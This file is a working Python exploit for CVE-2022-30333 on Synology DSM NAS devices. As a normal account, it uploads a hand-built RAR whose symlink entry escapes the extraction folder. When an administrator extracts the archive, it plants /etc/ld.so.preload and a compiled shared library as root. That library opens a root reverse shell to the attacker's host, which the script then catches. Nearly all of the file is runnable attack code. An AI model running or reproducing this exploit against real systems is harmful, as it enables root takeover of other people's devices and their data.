#!/usr/bin/env python3
r"""
Synology DSM RCE via a malicious RAR extracted by an administrator (CVE-2022-30333).

File Station's SYNO.FileStation.Extract runs the unpack with the CALLER's effective uid:
root for an administrator, the caller's own uid for a normal user. The bundled UnRAR 5.70
predates the CVE-2022-30333 fix, so a RAR entry that is a Windows symlink escapes the
extraction folder. When an ADMINISTRATOR extracts such an archive (a routine File Station
action), the escaping write lands anywhere on the appliance AS ROOT -> code execution.

This script is the attacker's side: as a normal DSM account it uploads a crafted RAR into
--dest, then listens and nudges a root CGI so the reverse shell returns as soon as an
administrator extracts the archive. The RAR plants /etc/ld.so.preload + /etc/libpoc.so;
the next root execve loads the library.

  python3 poc_rce.py --url https://nas:5001 --user alice --password 'Passw0rd!' \
      --dest /share --lhost 192.168.1.100 --lport 4444

--lhost is this machine as the NAS sees it; needs gcc to build the .so. The .so removes
/etc/ld.so.preload when it fires; if a run is interrupted before the shell connects, delete
/etc/ld.so.preload and /etc/libpoc.so and run `chown root:root /etc; chmod 0755 /etc` by
hand, since the extraction re-owns /etc (the parent of the planted files).
"""
import argparse
import json
import os
import select
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import urllib.parse
import urllib.request
import zlib
from http.cookiejar import CookieJar

PRELOAD_PATH = "/etc/ld.so.preload"
SO_PATH = "/etc/libpoc.so"
TRIGGER_CGI = "/webman/login.cgi"      # stock root-owned CGI; synoscgi execs it as root

SO_SOURCE = r"""
#define _GNU_SOURCE
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

/* Runs inside every process that execs while /etc/ld.so.preload points here.
   Do nothing unless we are a privileged process, and never disturb the host
   process: fork a child, return immediately in the parent. */
static void fire(void) {
    /* Atomic once-guard and self-clean: unlink() succeeds for exactly one process,
       so only the first root exec fires; removing the preload file also stops any
       further exec from loading us. This leaves no lingering lock, so re-runs work. */
    if (unlink("%(preload)s") != 0) return;
    if (fork() != 0) return;                    /* parent (host) continues */
    setsid();
    setgid(0); setuid(0);                       /* ruid/suid are 0 -> full root */
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a;
    a.sin_family = AF_INET;
    a.sin_port = htons(%(port)d);
    a.sin_addr.s_addr = inet_addr("%(host)s");
    if (connect(s, (struct sockaddr *)&a, sizeof a) == 0) {
        dup2(s, 0); dup2(s, 1); dup2(s, 2);
        execl("/bin/bash", "bash", "-i", (char *)0);
        execl("/bin/sh", "sh", "-i", (char *)0);
    }
    _exit(0);
}

__attribute__((constructor))
static void init(void) {
    if (getuid() == 0 || geteuid() == 0) fire();
}
"""


def build_so(lhost, lport):
    src = SO_SOURCE % {"host": lhost, "port": lport, "preload": PRELOAD_PATH}
    d = tempfile.mkdtemp()
    c = os.path.join(d, "libpoc.c")
    so = os.path.join(d, "libpoc.so")
    with open(c, "w") as f:
        f.write(src)
    subprocess.check_call(["gcc", "-shared", "-fPIC", "-O2",
                           "-Wno-unused-result", "-o", so, c])
    with open(so, "rb") as f:
        return f.read()


# Symlink target uses backslashes on purpose: that is the CVE-2022-30333 bug.
ETC_TARGET = "\\".join([".."] * 8 + ["etc"])


# --- minimal RAR5 builder (no external tools) -----------------------------

def vint(n):
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def block(htype, hflags, extra_area=b"", data_area=b"", specific=b""):
    body = vint(htype) + vint(hflags)
    if hflags & 0x0001:
        body += vint(len(extra_area))
    if hflags & 0x0002:
        body += vint(len(data_area))
    body += specific + extra_area
    hdr = vint(len(body)) + body
    crc = zlib.crc32(hdr) & 0xffffffff
    return struct.pack("<I", crc) + hdr + data_area


def file_header(name, data=b"", symlink_target=None, mode=0o644):
    name_b = name.encode()
    if symlink_target is not None:
        hostos, attr = 0, 0
    else:
        hostos, attr = 1, 0o100000 | mode          # S_IFREG | mode, Unix attributes
    specific = (vint(0) + vint(len(data)) + vint(attr) + vint(0) + vint(hostos)
                + vint(len(name_b)) + name_b)
    extra = b""
    hflags = 0x0002 if data else 0x0000
    if symlink_target is not None:
        t = symlink_target.encode()
        rec = vint(5) + vint(2) + vint(0) + vint(len(t)) + t   # type 5, WINSYMLINK, target
        extra = vint(len(rec)) + rec
        hflags |= 0x0001
    return block(2, hflags, extra_area=extra, data_area=data, specific=specific)


def build_rar(preload_line, so_bytes):
    """One symlink to /etc; both files are written through it (ld.so.preload and the .so)."""
    sig = b"Rar!\x1a\x07\x01\x00"
    main = block(1, 0, specific=vint(0))
    end = block(5, 0, specific=vint(0))
    a = file_header("a", symlink_target=ETC_TARGET)
    f1 = file_header("a/ld.so.preload", data=preload_line.encode(), mode=0o644)
    f2 = file_header("a/libpoc.so", data=so_bytes, mode=0o644)
    return sig + main + a + f1 + f2 + end


# --- DSM client -----------------------------------------------------------

_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE


class DSM:
    def __init__(self, url):
        self.base = url.rstrip("/")
        self.sid = None
        self.token = None
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=_ctx),
            urllib.request.HTTPCookieProcessor(CookieJar()))

    def _open(self, req):
        with self.opener.open(req, timeout=60) as r:
            return r.read()

    def _auth(self):
        p = {}
        if self.sid:
            p["_sid"] = self.sid
        if self.token:
            p["SynoToken"] = self.token
        return p

    def login(self, user, password):
        q = urllib.parse.urlencode({
            "api": "SYNO.API.Auth", "method": "login", "version": "6",
            "account": user, "passwd": password, "format": "sid",
            "enable_syno_token": "yes"})
        d = json.loads(self._open(urllib.request.Request(self.base + "/webapi/auth.cgi?" + q)))
        if not d.get("success"):
            raise SystemExit("login failed: %s" % d)
        self.sid = d["data"]["sid"]
        self.token = d["data"].get("synotoken")
        print("[1] logged in, sid:", self.sid)

    def upload(self, dest_dir, name, blob):
        boundary = "----pocboundary"

        def part(headers, body):
            return ("--%s\r\n%s\r\n\r\n" % (boundary, headers)).encode() + body + b"\r\n"

        body = b""
        for k, v in [("api", "SYNO.FileStation.Upload"), ("version", "2"),
                     ("method", "upload"), ("path", dest_dir),
                     ("create_parents", "true"), ("overwrite", "true")]:
            body += part('Content-Disposition: form-data; name="%s"' % k, v.encode())
        body += part(
            'Content-Disposition: form-data; name="file"; filename="%s"\r\n'
            'Content-Type: application/octet-stream' % name, blob)
        body += ("--%s--\r\n" % boundary).encode()
        url = self.base + "/webapi/entry.cgi?" + urllib.parse.urlencode(self._auth())
        req = urllib.request.Request(url, data=body, headers={
            "Content-Type": "multipart/form-data; boundary=" + boundary})
        print("[2] upload:", json.loads(self._open(req)))

    def trigger(self):
        """Force a fresh root execve so ld.so loads the preloaded .so."""
        try:
            self._open(urllib.request.Request(self.base + TRIGGER_CGI))
        except Exception:
            pass


# --- reverse-shell catcher ------------------------------------------------

def catch_shell(srv):
    conn, addr = srv.accept()
    print("[+] root shell from %s:%d" % addr)
    # Remove the planted files and stale lock dir, then restore /etc: the extraction
    # re-owns the parent of the planted files, leaving /etc non-root and thus locked.
    conn.sendall(b"rm -f %s %s 2>/dev/null; rm -rf /tmp/.p2 2>/dev/null; "
                 b"chown root:root /etc; chmod 0755 /etc; "
                 b"echo '[+] cleaned up; id:' $(id)\n"
                 % (PRELOAD_PATH.encode(), SO_PATH.encode()))
    old = None
    if sys.stdin.isatty():
        import termios
        import tty
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        tty.setraw(fd)
        a = termios.tcgetattr(fd)
        a[1] |= termios.OPOST | termios.ONLCR   # keep \n -> \r\n so output is not staircased
        termios.tcsetattr(fd, termios.TCSADRAIN, a)
    try:
        while True:
            r, _, _ = select.select([sys.stdin, conn], [], [])
            if conn in r:
                data = conn.recv(4096)
                if not data:
                    break
                os.write(sys.stdout.fileno(), data)
            if sys.stdin in r:
                data = os.read(sys.stdin.fileno(), 4096)
                if not data:
                    break
                conn.sendall(data)
    finally:
        if old is not None:
            import termios
            termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old)
        conn.close()


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", required=True, help="https://nas:5001")
    ap.add_argument("--user", required=True, help="a normal DSM account (the attacker)")
    ap.add_argument("--password", required=True)
    ap.add_argument("--dest", default="/home",
                    help="a folder the normal account can write and an admin can browse")
    ap.add_argument("--lhost", required=True, help="this machine, as the NAS reaches it")
    ap.add_argument("--lport", type=int, default=4444)
    args = ap.parse_args()

    so_bytes = build_so(args.lhost, args.lport)
    print("[*] built libpoc.so (%d bytes)" % len(so_bytes))

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", args.lport))
    srv.listen(1)

    dsm = DSM(args.url)
    dsm.login(args.user, args.password)
    dsm.upload(args.dest, "poc.rar", build_rar(SO_PATH + "\n", so_bytes))
    archive = args.dest.rstrip("/") + "/poc.rar"
    print("[*] planted %s. An administrator who extracts it in File Station writes" % archive)
    print("    %s + %s as root; the next root exec loads the library." % (PRELOAD_PATH, SO_PATH))

    print("\n[*] listening on 0.0.0.0:%d; nudging %s until it fires ...\n"
          % (args.lport, TRIGGER_CGI))
    srv.settimeout(5)
    while True:
        for _ in range(3):
            dsm.trigger()
        r, _, _ = select.select([srv], [], [], 5)
        if r:
            break
    srv.settimeout(None)
    catch_shell(srv)


if __name__ == "__main__":
    main()
